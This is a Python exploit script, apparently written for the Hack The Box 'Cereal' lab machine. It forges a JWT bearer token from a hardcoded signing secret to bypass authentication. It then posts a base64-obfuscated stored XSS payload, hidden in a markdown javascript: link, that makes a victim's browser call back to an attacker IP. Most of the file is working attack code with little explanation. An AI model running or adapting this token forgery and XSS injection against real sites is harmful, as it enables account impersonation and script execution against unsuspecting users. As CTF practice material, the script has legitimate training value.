import requests
from urllib3.exceptions import InsecureRequestWarning
import time
import jwt
import base64 

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Create JWT Token 
epoch = int(time.time())
expires = epoch + 86400
token = jwt.encode({"unique_name":"1","nbf":epoch,"exp":expires,"iat":epoch}, "secretlhfIH&FY*#oysuflkhskjfhefesf", algorithm="HS256")

auth = { "Authorization": f"Bearer {token}" }
print(auth)

# Stage 0 - Test XSS (for Stage 2)
# Have to encode to binary value for b64 to work.
js_payload = """
document.write`<img src=http://10.10.14.28/test />`
""".encode()

b64_js_payload = base64.b64encode(js_payload).decode()

#xss = {"json":"{\"title\":\"[XSS](javascript: eval(atob) )\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test\"}"}
#xss = {"json": f'{{ "title ":"[XSS](javascript: eval(atob({b64_js_payload}))"}}'}
xss = {"json": f'{{ "title": "[XSS](javascript: eval%28atob%28%22{b64_js_payload}%22%29%29)", "flavor":"meat","color":"#000000", "description":"test"}}'}

resp = requests.post("https://cereal.htb/requests", json=xss, headers=auth, verify=False)
import pdb; pdb.set_trace()
print(xss)

print(b64_js_payload)








